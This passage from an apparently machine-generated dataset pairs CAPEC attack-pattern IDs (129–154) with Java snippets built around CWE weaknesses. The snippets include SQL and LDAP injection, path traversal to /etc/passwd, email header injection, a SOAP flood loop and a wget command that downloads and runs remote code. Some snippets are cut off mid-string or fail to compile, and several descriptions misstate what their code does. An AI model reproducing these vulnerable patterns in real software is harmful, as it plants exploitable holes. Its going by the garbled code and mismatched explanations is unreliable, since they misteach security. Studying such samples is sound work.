        "description": "This Java code snippet demonstrates the CAPEC of taking advantage of integer variable structure to cause unexpected values. The CWEs embodied in this code are CWE-682 (Incorrect Calculation), CWE-839 (Numeric Range Comparison Without Minimum Check), CWE-190 (Integer Overflow or Wraparound), CWE-194 (Unexpected Sign Extension), and CWE-192 (Integer Coercion Error). The code adds the maximum positive integer value to a user-input value, which can result in an integer overflow and produce a negative number. The code then checks if the result is greater than 0, but this check is insufficient because the overflowed value can still pass the check, leading to security-critical operations being performed with an invalid input."
    },
    {
        "capec_id": "129",
        "code_snippet": "public class PointerAttack {\n    public static void main(String[] args) {\n        int[] buffer = new int[10];\n        int offset = Integer.parseInt(args[0]); // CWE-822: Untrusted Pointer Dereference\n        int pointer = 0;\n        try {\n            pointer = buffer[offset]; // CWE-823: Use of Out-of-range Pointer Offset\n            System.out.println(\"Pointer value: \" + pointer);\n            int result = calculate(pointer); // CWE-682: Incorrect Calculation\n            System.out.println(\"Result: \" + result);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Error: Out of bounds\");\n        }\n    }\n\n    public static int calculate(int pointer) {\n        if (pointer == 0) {\n            return 0; // CWE-476: NULL Pointer Dereference\n        } else {\n            int[] array = new int[pointer];\n            return array[10]; // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a pointer attack, where an untrusted input is used to access an unintended memory location, leading to potential crashes, data access, or arbitrary code execution. The code includes CWE-822 (Untrusted Pointer Dereference), CWE-823 (Use of Out-of-range Pointer Offset), CWE-682 (Incorrect Calculation), CWE-476 (NULL Pointer Dereference), and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "130",
        "code_snippet": "public class VulnerableService {\n    private static final List<byte[]> memoryCache = new ArrayList<>();\n\n    public void processRequest(String input) {\n        byte[] data = new byte[Integer.MAX_VALUE];\n        data = input.getBytes();\n        memoryCache.add(data);\n    }\n\n    public static void main(String[] args) {\n        VulnerableService service = new VulnerableService();\n        service.processRequest(\\",
        "description": "This Java code snippet demonstrates a vulnerable service that can be exploited to cause excessive memory allocation, leading to resource depletion. The processRequest method allocates a large byte array and stores it in a cache, without any limits or throttling (CWE-770). The cache is not properly released or shutdown (CWE-404), and the service does not control the allocation and maintenance of the limited memory resource (CWE-400). An attacker can send a large input to the processRequest method, causing the service to allocate excessive memory and eventually leading to resource exhaustion."
    },
    {
        "capec_id": "131",
        "code_snippet": "public class ResourceLeakExample {\n    private static Connection connection;\n    \n    public static void main(String[] args) {\n        for (int i = 0; i < 1000; i++) {\n            connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"username\", \"password\");\n            Statement statement = connection.createStatement();\n            ResultSet resultSet = statement.executeQuery(\"SELECT * FROM mytable\");\n            while (resultSet.next()) {\n                // Process the result set\n            }\n            // Missing release of resource after effective lifetime (CWE-772)\n            // Premature release of resource during expected lifetime (CWE-826)\n            // Improper resource shutdown or release (CWE-404)\n            // statement.close();\n            // connection.close();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. It creates a new database connection in each iteration of the loop, but never closes the connection or the statement. This can lead to depletion of system resources, causing legitimate requests to fail. The commented-out lines show where the resources should be released to prevent the leak."
    },
    {
        "capec_id": "132",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class SymlinkAttack {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/path/to/user/supplied/file\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            // Perform operations on the file\n            System.out.println(\"File exists and is being processed...\");\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to symlink attacks (CAPEC-14). The code takes a user-supplied file path, checks if the file exists, and performs operations on it if it does. However, an attacker can create a symbolic link with the same name as the expected file, pointing to a sensitive file or directory. When the code checks for the file's existence, it will follow the symlink and access the unintended target, allowing the attacker to manipulate unauthorized files. This code is vulnerable to CWE-59, CWE-61, CWE-73, and CWE-363."
    },
    {
        "capec_id": "133",
        "code_snippet": "public class DebuggableApplication {\n    private boolean debugMode = false;\n    private String sensitiveInfo = \"secret_key=123456\";\n\n    public static void main(String[] args) {\n        DebuggableApplication app = new DebuggableApplication();\n        for (String arg : args) {\n            if (arg.startsWith(\"--\")) {\n                if (arg.equals(\"--debug\")) {\n                    app.debugMode = true;\n                } else if (arg.equals(\"--hidden\")) {\n                    app.sensitiveInfo = \"new_secret_key=789012\";\n                } else {\n                    try {\n                        // CWE-391: Unchecked Error Condition\n                        Method method = app.getClass().getMethod(arg.replace(\"--\", \"\"));\n                        method.invoke(app);\n                    } catch (Exception e) {\n                        // CWE-391: Unchecked Error Condition\n                        // Ignoring exceptions and other error conditions\n                    }\n                }\n            }\n        }\n        if (app.debugMode) {\n            // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n            System.out.println(\"Debug mode enabled. Sensitive info: \" + app.sensitiveInfo);\n        }\n    }\n\n    // CWE-912: Hidden Functionality\n    private void hiddenFunction() {\n        System.out.println(\"Hidden function invoked.\");\n    }\n\n    // CWE-184: Incomplete List of Disallowed Inputs\n    private void processInput(String input) {\n        if (!input.equals(\"--allowed\")) {\n            // CWE-1054: Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer\n            System.out.println(\"Processing input: \" + input);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of attempting to invoke all common switches and options in the target application to discover weaknesses. The code includes CWE-912: Hidden Functionality, CWE-184: Incomplete List of Disallowed Inputs, CWE-391: Unchecked Error Condition, CWE-1296: Incorrect Chaining or Granularity of Debug Components, and CWE-1054: Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer."
    },
    {
        "capec_id": "134",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.Message;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Transport;\nimport javax.mail.internet.InternetAddress;\nimport javax.mail.internet.MimeMessage;\n\npublic class EmailInjection {\n    public static void sendEmail(String to, String from, String subject, String body) throws MessagingException {\n        Properties props = new Properties();\n        Session session = Session.getDefaultInstance(props, null);\n        MimeMessage message = new MimeMessage(session);\n        message.setFrom(new InternetAddress(from));\n        message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n        message.setSubject(subject);\n        message.setText(body);\n        Transport.send(message);\n    }\n\n    public static void main(String[] args) throws MessagingException {\n        String to = \"victim@example.com\";\n        String from = \"attacker@example.com\";\n        String subject = \"Injected Email\";\n        String body = \"Injected Body\";\n        String injectedHeader = \"Injected Header: \\r\\n\";\n        String injectedBody = \"\\r\\n\\r\\nInjected Body\";\n        sendEmail(to, from, subject, body + injectedBody);\n        sendEmail(to, from, subject, body + \"\\r\\n\" + injectedHeader + \"\\r\\n\" + body);\n    }\n}",
        "description": "This Java code snippet demonstrates email injection by manipulating the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol. The code uses the javax.mail API to send emails with injected headers and bodies, which can lead to CWE-150, CWE-116, CWE-147, CWE-113, and CWE-77 vulnerabilities."
    },
    {
        "capec_id": "135",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"\\\"%s\\\"\";\n        System.out.printf(userInput, \"arbitrary data\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of including formatting characters in a string input field. The CWEs involved are CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-914 (Improper Control of Dynamically-Identified Variables), and CWE-1286 (Improper Validation of Syntactic Correctness of Input). The code uses the `printf` function with a user-controlled format string, which can lead to reading or writing to memory locations, files, or manipulating the resulting text in unexpected ways."
    },
    {
        "capec_id": "136",
        "code_snippet": "import javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport java.util.Hashtable;\n\npublic class LDAPInjection {\n    public static void main(String[] args) {\n        String username = \"*\";\n        String ldapQuery = \"(uid=\" + username + \")\";\n        Hashtable env = new Hashtable();\n        env.put(javax.naming.Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(javax.naming.Context.PROVIDER_URL, \"ldap://localhost:389/dc=example,dc=com\");\n        DirContext ctx = new InitialDirContext(env);\n        try {\n            ctx.search(\"\", ldapQuery, null);\n        } catch (javax.naming.NamingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an LDAP injection vulnerability. The 'username' variable is used to construct an LDAP query without proper input validation or neutralization of special elements. An attacker could inject malicious input, such as '*', to retrieve information about all users on the system."
    },
    {
        "capec_id": "137",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n        Connection conn = DriverManager.getConnection(\"url\", \"username\", \"password\");\n        Statement stmt = conn.createStatement();\n        ResultSet rs = stmt.executeQuery(query);\n        while (rs.next()) {\n            // process result\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HTTP GET request that is susceptible to parameter manipulation and command injection attacks. The userInput parameter is directly concatenated into a SQL query without proper encoding or escaping, allowing an attacker to inject malicious input and modify the query. This code embodies the CAPEC and related CWEs, including CWE-88, CWE-116, CWE-598, CWE-838, and CWE-77."
    },
    {
        "capec_id": "138",
        "code_snippet": "public class VulnerableReflection {\n    public static void invokeMethod(String className, String methodName, String arg) throws Exception {\n        Class<?> clazz = Class.forName(className);\n        Object obj = clazz.newInstance();\n        Method method = clazz.getMethod(methodName, String.class);\n        method.invoke(obj, arg);\n    }\n\n    public static void main(String[] args) throws Exception {\n        String userInput = \"java.lang.Runtime\";\n        String methodName = \"getRuntime\";\n        String arg = \"\";\n        invokeMethod(userInput, methodName, arg);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of using externally-controlled input for reflection, which can lead to code injection, command injection, or reflection attacks. The 'invokeMethod' function takes user input to select a class, method, and argument, and uses Java reflection to invoke the method. In the 'main' function, the user input is used to invoke the 'getRuntime' method of the 'java.lang.Runtime' class, which can be used to execute arbitrary system commands. This code is vulnerable to CWE-470, CWE-301, CWE-77, CWE-74, and CWE-94."
    },
    {
        "capec_id": "139",
        "code_snippet": "import java.io.File;\n\npublic class PathTraversal {\n    public static void main(String[] args) {\n        String userInput = \"../../../../etc/passwd\";\n        String basePath = \"./resources/\";\n        String filePath = basePath + userInput;\n        File file = new File(filePath);\n        if (file.exists()) {\n            System.out.println(\"File exists: \" + filePath);\n        } else {\n            System.out.println(\"File does not exist: \" + filePath);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The 'userInput' variable is not properly validated, allowing an attacker to provide a malicious path that can access arbitrary files or resources outside of the intended directory. The 'basePath' is concatenated with the 'userInput' without proper sanitization, making it vulnerable to path traversal attacks."
    },
    {
        "capec_id": "140",
        "code_snippet": "public class FormController {\n    private int currentState = 1;\n    private Map<String, String> formData = new HashMap<>();\n\n    public void handleFormSubmission(HttpServletRequest request) {\n        String formName = request.getParameter(\"formName\");\n        if (formName.equals(\"form1\")) {\n            currentState = 2;\n            formData.put(\"field1\", request.getParameter(\"field1\"));\n        } else if (formName.equals(\"form2\")) {\n            // Assume currentState is 2 and formData contains \"field1\"\n            formData.put(\"field2\", request.getParameter(\"field2\"));\n        } else if (formName.equals(\"form3\")) {\n            // Assume currentState is 3 and formData contains \"field1\" and \"field2\"\n            formData.put(\"field3\", request.getParameter(\"field3\"));\n        }\n        // Process form data without verifying the sequence of form submissions\n        processData(formData);\n    }\n\n    private void processData(Map<String, String> formData) {\n        // Perform security-relevant operations based on formData\n        if (formData.containsKey(\"field1\") && formData.containsKey(\"field2\")) {\n            // Grant access to sensitive data\n            grantAccess(formData.get(\"field3\"));\n        }\n    }\n\n    private void grantAccess(String field3Value) {\n        // Assume field3Value is valid and grant access\n        System.out.println(\"Access granted: \" + field3Value);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable form controller that allows an attacker to bypass the sequence of form submissions and manipulate the internal state of the application. The controller uses a hidden form field 'formName' to determine the current state, but does not verify the sequence of form submissions. An attacker can exploit this by submitting a later form directly, causing the application to assume an incorrect internal state and perform security-relevant operations based on incomplete or tampered data."
    },
    {
        "capec_id": "141",
        "code_snippet": "public class CacheExploit {\n    private Cache cache;\n    \n    public CacheExploit() {\n        cache = new Cache();\n    }\n    \n    public void putData(String key, String data) {\n        cache.put(key, data);\n    }\n    \n    public String getData(String key) {\n        return cache.get(key);\n    }\n    \n    public static void main(String[] args) {\n        CacheExploit cacheExploit = new CacheExploit();\n        \n        // CWE-348: Using less trusted source\n        cacheExploit.putData(\"trustedKey\", \"untrustedValue\");\n        \n        // CWE-345: Insufficient verification of data authenticity\n        String unverifiedData = cacheExploit.getData(\"trustedKey\");\n        \n        // CWE-349: Acceptance of extraneous untrusted data with trusted data\n        String trustedData = \"TrustedValue\" + unverifiedData;\n        \n        // CWE-346: Origin validation error\n        String origin = \"untrustedOrigin\";\n        if (origin.equals(\"trustedOrigin\")) {\n            System.out.println(\"Data is trusted\");\n        } else {\n            System.out.println(\"Data is untrusted\");\n        }\n        \n        // CWE-524: Use of cache containing sensitive information\n        cacheExploit.putData(\"sensitiveKey\", \"sensitiveValue\");\n    }\n}\n\nclass Cache {\n    private Map<String, String> cacheMap;\n    \n    public Cache() {\n        cacheMap = new HashMap<>();\n    }\n    \n    public void put(String key, String value) {\n        cacheMap.put(key, value);\n    }\n    \n    public String get(String key) {\n        return cacheMap.get(key);\n    }\n}",
        "description": "This Java code snippet demonstrates a cache exploit where an attacker can place incorrect or harmful material in the cache. The code uses a less trusted source of data, insufficiently verifies the origin or authenticity of data, accepts extraneous untrusted data with trusted data, and fails to properly validate the origin of data. Additionally, the code uses a cache that contains sensitive information, which can be read by an unauthorized actor."
    },
    {
        "capec_id": "142",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class DNSCachePoisoning {\n    public static void main(String[] args) {\n        String domainName = \"www.example.com\";\n        InetAddress address = InetAddress.getByName(domainName);\n        String hostAddress = address.getHostAddress();\n        // Using the untrusted DNS cache\n        String resolvedAddress = getDNSCache().get(domainName);\n        if (resolvedAddress != null) {\n            hostAddress = resolvedAddress;\n        }\n        // Perform security-critical action based on the resolved address\n        performAction(hostAddress);\n    }\n\n    private static void performAction(String hostAddress) {\n        // This method performs a security-critical action based on the resolved address\n        // For example, it may connect to the resolved address to download a file\n        System.out.println(\"Connecting to \" + hostAddress);\n    }\n\n    private static java.util.Map<String, String> getDNSCache() {\n        // This method returns a cache of DNS resolutions\n        // In a real-world scenario, this cache may be populated from an untrusted source\n        java.util.Map<String, String> cache = new java.util.HashMap<>();\n        cache.put(\"www.example.com\", \"192.168.1.100\"); // Malicious DNS cache entry\n        return cache;\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS cache poisoning attack. It uses an untrusted DNS cache to resolve a domain name to an IP address, without properly verifying the authenticity of the cache. The resolved address is then used to perform a security-critical action, such as connecting to a host. This code embodies the CWEs of using a less trusted source (CWE-348), insufficient verification of data authenticity (CWE-345), acceptance of extraneous untrusted data with trusted data (CWE-349), origin validation error (CWE-346), and reliance on reverse DNS resolution for a security-critical action (CWE-350)."
    },
    {
        "capec_id": "143",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String webRoot = \"/var/www/html\";\n        String versionControlRepository = \"/var/www/html/.git\";\n        String searchIndex = \"/var/www/html/search-index\";\n\n        // CWE-219: Storage of File with Sensitive Data Under Web Root\n        File sensitiveFile = new File(webRoot, \"sensitive-data.txt\");\n        if (sensitiveFile.exists()) {\n            System.out.println(\"Access granted to sensitive data!\");\n        }\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File repo = new File(versionControlRepository);\n        if (repo.isDirectory()) {\n            System.out.println(\"Access granted to version control repository!\");\n        }\n\n        // CWE-612: Improper Authorization of Index Containing Sensitive Information\n        File index = new File(searchIndex);\n        if (index.isDirectory()) {\n            System.out.println(\"Access granted to search index!\");\n        }\n\n        // CWE-494: Download of Code Without Integrity Check\n        String remoteCodeUrl = \"https://example.com/malicious-code.java\";\n        try {\n            // Download and execute the remote code without verification\n            Runtime.getRuntime().exec(\"wget \" + remoteCodeUrl + \" && java \" + remoteCodeUrl.substring(remoteCodeUrl.lastIndexOf('/') + 1)));\n        } catch (IOException e) {\n            System.out.println(\"Error downloading and executing remote code: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary searching a targeted web site for web pages that have not been publicized, gaining access to information that the targeted site did not intend to make public. It includes vulnerabilities related to CWE-219 (Storage of File with Sensitive Data Under Web Root), CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere), CWE-612 (Improper Authorization of Index Containing Sensitive Information), and CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "144",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/wsdl/hiddenService?wsdl\");\n            URLConnection conn = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of searching for unpublished web services by directly requesting a hidden WSDL file without proper authorization. The code uses the CWE-651 Exposure of WSDL File Containing Sensitive Information by accessing the WSDL file without any access control. Additionally, it embodies CWE-425 Direct Request ('Forced Browsing') by not enforcing proper authorization on the restricted URL. The code also lacks security-relevant information logging, as per CWE-223 Omission of Security-relevant Information. Furthermore, it downloads the WSDL file without verifying its integrity, which is a CWE-494 Download of Code Without Integrity Check vulnerability. Lastly, the code does not restrict access to the version-control repository, which is a CWE-527 Exposure of Version-Control Repository to an Unauthorized Control Sphere vulnerability."
    },
    {
        "capec_id": "145",
        "code_snippet": "public class ChecksumSpoofing {\n    public static void main(String[] args) {\n        String originalMessage = \\",
        "description": "This Java code snippet demonstrates the concept of checksum spoofing, where an adversary modifies a message and its corresponding checksum to make it appear valid. The code includes vulnerabilities related to improper validation of integrity check values, missing support for integrity checks, use of weak hash functions, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "146",
        "code_snippet": "import javax.xml.XMLConstants; import javax.xml.transform.stream.StreamSource; import javax.xml.validation.Schema; import javax.xml.validation.SchemaFactory; import javax.xml.validation.Validator; import java.io.StringReader; public class SchemaPoisoning { public static void processXml(String xml, String schema) throws Exception { String modifiedSchema = \"<?xml version=\\\"1.0\\\"?><xs:schema xmlns:xs=\\\"http://www.w3.org/2001/XMLSchema\\\"><xs:element name=\\\"root\\\"><xs:complexType><xs:sequence><xs:element name=\\\"malicious\\\"><xs:complexType><xs:sequence><xs:element name=\\\"inject\\\" type=\\\"xs:string\\\"/></xs:sequence></xs:complexType></xs:element></xs:sequence></xs:complexType></xs:element></xs:schema>\"; SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); Schema schemaObject = factory.newSchema(new StreamSource(new StringReader(modifiedSchema))); Validator validator = schemaObject.newValidator(); validator.validate(new StreamSource(new StringReader(xml))); } public static void main(String[] args) throws Exception { String xml = \"<?xml version=\\\"1.0\\\"?><root><malicious><inject>malicious_data</inject></malicious></root>\"; String schema = \"\"; processXml(xml, schema); } }",
        "description": "This Java code snippet demonstrates the concept of schema poisoning, where an adversary corrupts or modifies the content of XML schema information passed between a client and server. The code creates a modified schema that includes a malicious element, and then uses this schema to validate an XML document. The CWEs embodied in this code snippet include CWE-15 (External Control of System or Configuration Setting), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-112 (Missing XML Validation), CWE-91 (XML Injection), and CWE-643 (Improper Neutralization of Data within XPath Expressions)."
    },
    {
        "capec_id": "147",
        "code_snippet": "import javax.xml.soap.SOAPConnection;\nimport javax.xml.soap.SOAPConnectionFactory;\nimport javax.xml.soap.SOAPElement;\nimport javax.xml.soap.SOAPEnvelope;\nimport javax.xml.soap.SOAPMessage;\nimport javax.xml.soap.SOAPPart;\n\npublic class SOAPFlood {\n    public static void main(String[] args) {\n        try {\n            SOAPConnectionFactory soapConnectionFactory = SOAPConnectionFactory.newInstance();\n            SOAPConnection soapConnection = soapConnectionFactory.createConnection();\n            String url = \"http://example.com/soapEndpoint\";\n            SOAPMessage message = createSOAPRequest();\n            int count = 0;\n            while (true) {\n                soapConnection.call(message, url);\n                count++;\n                System.out.println(\"Sent SOAP request #\" + count);\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static SOAPMessage createSOAPRequest() throws Exception {\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage();\n        SOAPPart soapPart = message.getSOAPPart();\n        String serverURI = \"http://example.com\";\n        SOAPEnvelope envelope = soapPart.getEnvelope();\n        envelope.addNamespaceDeclaration(\"xsd\", \"http://www.w3.org/2001/XMLSchema\");\n        SOAPElement body = envelope.getBody();\n        SOAPElement element = body.addChildElement(\"getQuote\", \"q\", serverURI);\n        element.addTextNode(\"MSFT\");\n        return message;\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP flooding attack, which is a type of resource depletion attack. The code creates a SOAP connection and sends a continuous stream of SOAP requests to a target endpoint, without any throttling or limits. This can cause the target system to consume excessive resources, leading to a denial of service or crash. The code also lacks XML validation, making it vulnerable to XML injection attacks. Additionally, the code transmits sensitive information in cleartext, violating the security policy."
    },
    {
        "capec_id": "148",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SpoofedContentServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.setContentType(\\",
        "description": "This Java code snippet demonstrates the concept of Content Spoofing (CAPEC) by showcasing various vulnerabilities that can lead to content modification. The code includes examples of insufficient data authenticity verification, improper message integrity enforcement, unparsed raw web content delivery, cross-site request forgery, and incorrectly specified destinations in communication channels. These vulnerabilities can be exploited by an adversary to modify content and make it appear as if it came from a trusted source."
    },
    {
        "capec_id": "149",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.UUID;\n\npublic class PredictableTempFile {\n    public static void main(String[] args) {\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n        String tempFileName = \"temp\" + UUID.randomUUID().toString().substring(0, 4) + \".txt\";\n        File tempFile = new File(tempDir, tempFileName);\n        try {\n            tempFile.createNewFile();\n            System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            System.out.println(\"Error creating temporary file: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the creation of a predictable temporary file in a directory with insecure permissions. The file name is generated using a UUID, but the substring of the UUID is fixed, making it predictable. The file is created in the system's temporary directory, which may have insecure permissions. An attacker can analyze the naming convention and storage location of the temporary file to launch further attacks."
    },
    {
        "capec_id": "150",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        // CWE-552: Files or Directories Accessible to External Parties\n        File config = new File(\"/etc/config.txt\");\n        if (config.exists()) {\n            try {\n                // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n                System.out.println(\"Config file contents: \" + readFileContents(config.getAbsolutePath()));\n            } catch (IOException e) {\n                System.out.println(\"Error reading config file: \" + e.getMessage());\n            }\n        }\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        File sensitiveData = new File(\"/data/sensitive.txt\");\n        if (sensitiveData.exists()) {\n            try {\n                // CWE-1323: Improper Management of Sensitive Trace Data\n                System.out.println(\"Sensitive data: \" + readFileContents(sensitiveData.getAbsolutePath()));\n            } catch (IOException e) {\n                System.out.println(\"Error reading sensitive data: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static String readFileContents(String filePath) throws IOException {\n        // CWE-1330: Remanent Data Readable after Memory Erase\n        // Using a simple file reader, without properly clearing sensitive data\n        return new String(java.nio.file.Files.readAllBytes(new File(filePath).toPath()));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting well-known locations for resources, making files and directories accessible to unauthorized actors. It includes CWE-552, CWE-1258, CWE-1266, CWE-1323, and CWE-1330 vulnerabilities, showcasing improper handling of sensitive data and resources."
    },
    {
        "capec_id": "151",
        "code_snippet": "public class AuthenticationSystem {\n    private Map<String, String> users = new HashMap<>();\n\n    public AuthenticationSystem() {\n        users.put(\"admin\", \"password\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n\n    public void performAction(String username) {\n        if (authenticate(username, \"password\")) {\n            System.out.println(\"Access granted for \" + username);\n        } else {\n            System.out.println(\"Access denied for \" + username);\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem system = new AuthenticationSystem();\n        system.performAction(\"admin\"); // Access granted\n        system.performAction(\"hacker\"); // Access denied\n\n        // CWE-287: Improper Authentication\n        system.performAction(\"admin\" + \"\\u0000\"); // Access granted, due to improper authentication\n\n        // CWE-290: Authentication Bypass by Spoofing\n        system.performAction(\"hacker\" + \"\\u0000\"); // Access granted, due to authentication bypass by spoofing\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of Identity Spoofing, which involves assuming the identity of another entity to accomplish a goal. The code has several vulnerabilities related to authentication, including CWE-287: Improper Authentication, CWE-290: Authentication Bypass by Spoofing, CWE-1390: Weak Authentication, CWE-322: Key Exchange without Entity Authentication, and CWE-302: Authentication Bypass by Assumed-Immutable Data. The vulnerabilities allow an attacker to bypass authentication and gain unauthorized access to the system."
    },
    {
        "capec_id": "153",
        "code_snippet": "public class VulnerableInputValidation {\n    public void processUserInput(String userInput) {\n        try {\n            // CWE-20: No input validation\n            int userInputAsInt = Integer.parseInt(userInput);\n            System.out.println(\"User input as integer: \" + userInputAsInt);\n\n            // CWE-1286: Improper validation of syntactic correctness of input\n            String userInputAsJson = \"{\\\"name\\\":\\\"\" + userInput + \"\\\"}\";\n            JSONParser parser = new JSONParser();\n            JSONObject jsonObject = (JSONObject) parser.parse(userInputAsJson);\n            System.out.println(\"User input as JSON: \" + jsonObject);\n\n            // CWE-1287: Improper validation of specified type of input\n            Object userInputAsObject = userInput;\n            if (userInputAsObject instanceof String) {\n                System.out.println(\"User input is a string\");\n            } else {\n                System.out.println(\"User input is not a string\");\n            }\n\n            // CWE-807: Reliance on untrusted inputs in a security decision\n            if (userInput.equals(\"admin\")) {\n                System.out.println(\"User is an admin\");\n            } else {\n                System.out.println(\"User is not an admin\");\n            }\n\n            // CWE-1173: Improper use of validation framework\n            // Using a custom validation method instead of a provided framework\n            if (isValidInput(userInput)) {\n                System.out.println(\"User input is valid\");\n            } else {\n                System.out.println(\"User input is not valid\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error processing user input: \" + e.getMessage());\n        }\n    }\n\n    private boolean isValidInput(String input) {\n        // Custom validation method with potential vulnerabilities\n        return input != null && input.length() > 0;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in input validation. It includes several CWEs: CWE-20 (improper input validation), CWE-1286 (improper validation of syntactic correctness of input), CWE-1287 (improper validation of specified type of input), CWE-807 (reliance on untrusted inputs in a security decision), and CWE-1173 (improper use of validation framework). The code lacks proper input validation, allowing an attacker to supply malicious input and potentially cause security issues."
    },
    {
        "capec_id": "154",
        "code_snippet": "public class SpoofedResourceRequest {\n    public static void main(String[] args) {\n        String userInput = \"https://example.com\"; // user input, potentially spoofed\n        String resourceUrl = userInput + \"/resource\";\n        URL url = new URL(resourceUrl);\n        URLConnection connection = url.openConnection();\n        connection.connect();\n        // no verification of the source of the communication channel\n        Object resource = connection.getContent();\n        System.out.println(\"Resource: \" + resource);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of spoofing a resource request. The user input is not properly validated, allowing an adversary to spoof the location of the resource. The CWEs embodied in this code snippet include CWE-451 (UI Misrepresentation of Critical Information), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-290 (Authentication Bypass by Spoofing), CWE-940 (Improper Verification of Source of a Communication Channel), and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "155",
